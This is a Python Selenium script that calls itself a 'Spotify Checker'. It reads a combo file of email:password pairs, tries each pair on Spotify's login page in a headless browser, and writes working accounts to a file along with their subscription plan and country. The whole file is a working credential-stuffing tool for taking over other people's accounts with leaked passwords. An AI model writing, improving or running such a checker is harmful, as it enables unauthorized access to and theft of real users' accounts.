from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
import os
import time
options = webdriver.ChromeOptions()
options.headless = True
options.add_argument("--window-size=1920,1080")
options.add_argument('--ignore-certificate-errors')
options.add_argument('--allow-running-insecure-content')
options.add_argument("--disable-extensions")
options.add_argument("--proxy-server='direct://'")
options.add_argument("--proxy-bypass-list=*")
options.add_argument("--start-maximized")
options.add_argument('--disable-gpu')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--no-sandbox')
driver = webdriver.Chrome(f'C:\Program Files\Google\Chrome\Application\96.0.4664.110\chromedriver.exe',options=options) #hna 5assek tkteb blassa li 7at fih driver dyal chrome
driver.get('https://www.spotify.com/account/overview')
print()
print('''\033[1;31;40m                                                                           
                              ____                 _    _   __            ____  _                  _                
                             / ___|  _ __    ___  | |_ (_) / _| _   _    / ___|| |__    ___   ___ | | __  ___  _ __ 
                             \___ \ | '_ \  / _ \ | __|| || |_ | | | |  | |    | '_ \  / _ \ / __|| |/ / / _ \| '__|
                              ___) || |_) || (_) || |_ | ||  _|| |_| |  | |___ | | | ||  __/| (__ |   < |  __/| |   
                             |____/ | .__/  \___/  \__||_||_|   \__, |   \____||_| |_| \___| \___||_|\_\ \___||_|   
                                    |_|                         |___/                                               
                                          
             © Netflix Checker by sevenLOMA                                                       
\033''')
print()
while True:
    print('''\033[1;34;40m''',end='')
    combo_name=input('Entry Combo: \033[1;33;40m')
    print('''\033[1;34;40m''',end='')
    if os.path.exists(f'{combo_name}.txt') :
        break
print()
file_combo = open(f'{combo_name}.txt', 'r+')
file_combo_failed = open('combo_failed.txt', 'a+')
file_combo_successful = open('combo_successful.txt', 'a+')
bad_acc,good_acc,prem_acc=0,0,0
n=-1
def line_num(name_file,line_count = 0):
    for line in name_file:
        if ':' in line:
            if line != '\n':
                line_count = line_count+1
    return line_count
print(f'''\033[1;32;40m _________ Settings _______________________________________________\n\
|\n| \033[1;34;40m[INFO]\033[0;0m\033[1;32;40m [>>] {combo_name}.txt Loaded : \033[1;33;40m{line_num(file_combo)}\033[0;0m\033[1;32;40m
|\n\
|\n| \033[1;34;40m[INFO]\033[0;0m\033[1;32;40m [>>] proxy.txt Loaded : \033[1;33;40m0\033[0;0m\033[1;32;40m
|\n\
|\n\
|_________________________________________________________________\033\n''')
time.sleep(3)
file_combo = open(f'{combo_name}.txt', 'r+')
try:
    for line_combo in file_combo:
        file_combo = open(f'{combo_name}.txt', 'r+')
        n = n + 1
        if ':' in line_combo:
            d = line_combo.split(":")
            mail, passw = d[0], d[1]
            try:
                time.sleep(0.1)
                driver.find_element_by_name('username').send_keys(mail)
                driver.find_element_by_name('password').send_keys(passw)
                driver.find_element_by_xpath('//*[@id="login-button"]').click()
                time.sleep(0.5)
                driver.find_element_by_id('login-username').clear()
                driver.find_element_by_id('login-password').clear()
                try:
                    technical_difficult = driver.find_element_by_xpath('//*[@id="app"]/body/div[1]/div[2]/div/div[2]/div/p/span/a')
                    print()
                    print(f'\033[1;33;40m[!]  ####  technical difficulties  ####  \033')
                    driver.close()
                    driver = webdriver.Chrome(f'C:\Program Files\Google\Chrome\Application\96.0.4664.110\chromedriver.exe',options=options) #hna 5assek tkteb blassa li 7at fih driver dyal chrome
                    driver.get('https://www.spotify.com/account/overview')
                except NoSuchElementException:
                    print()
                    print(f'\033[1;31;40m[!] Login failed ## (Incorrect) => \033[1;37;40m{mail}:{passw}')
                    print()
                    file_combo = open(f'{combo_name}.txt', "r+")
                    line_combo = file_combo.readlines()
                    line_r=line_combo[n].rstrip()
                    line_combo_Incorrect = (f'[!] Incorrect | {line_r}\n')
                    file_combo_failed = open('combo_failed.txt', 'a+')
                    file_combo_failed.write(line_combo_Incorrect)
                    file_combo_failed.close()
                    line_combo[n] = (f'[!] Login failed ## (Incorrect) => {mail}={passw}')
                    file_combo = open(f'{combo_name}.txt', "w+")
                    file_combo.writelines(line_combo)
                    file_combo.close()
                    bad_acc=bad_acc+1
            except NoSuchElementException:
                acc_free = driver.find_element_by_xpath('//*[@id="your-plan"]/section/div/div[1]/div[1]/span')
                if acc_free.is_displayed():
                    region = driver.find_element_by_xpath('//*[@id="__next"]/div/div/div[2]/div[3]/div[2]/div/article[1]/section/table/tbody/tr[4]/td[2]')
                    print()
                    acc_txt=acc_free.text
                    if acc_txt != 'Spotify Free':
                        prem_acc = prem_acc+1
                    region_txt=region.text
                    print(f'\033[1;32;40m[+] Login successful ## ({acc_txt}) => \033[1;37;40m{mail}:{passw}')
                    driver.close()
                    driver = webdriver.Chrome(f'C:\Program Files\Google\Chrome\Application\96.0.4664.110\chromedriver.exe',options=options) #hna 5assek tkteb blassa li 7at fih driver dyal chrome
                    driver.get('https://www.spotify.com/account/overview')
                    file_combo = open(f'{combo_name}.txt', "r+")
                    line_combo = file_combo.readlines()
                    line_w=line_combo[n].rstrip()
                    line_combo_successfulll = (f'{line_w} | Plan : {acc_txt} | Country : {region_txt}\n')
                    file_combo_successful = open('combo_successful.txt', 'a+')
                    file_combo_successful.write(line_combo_successfulll)
                    file_combo_successful.close()
                    line_combo[n] = (f'[+] Login successful ## ({acc_txt}) => {mail}={passw}')
                    file_combo = open(f'{combo_name}.txt', "w+")
                    file_combo.writelines(line_combo)
                    file_combo.close()
                good_acc=good_acc+1
        print(f'\033[1;33;40m Checker is running - \033[1;32;40m[+] Good Accounts  : [{good_acc}] \033[1;33;40m~~~ \033[1;31;40m[-] Bad Accounts  :  [{bad_acc}] ',end='\r')
except NoSuchElementException:
    print()
    print('\033[1;33;40m\n                  #############################                  HTTP ERROR 403                  #############################\n\033[1;31;40m')  
print()
driver.close()
print(f'\n\033[1;33;40m Checker result - \033[1;32;40m[+] Good Accounts  : [{good_acc}] \033[1;33;40m~~~ \033[1;31;40m[-] Bad Accounts  :  [{bad_acc}] \n')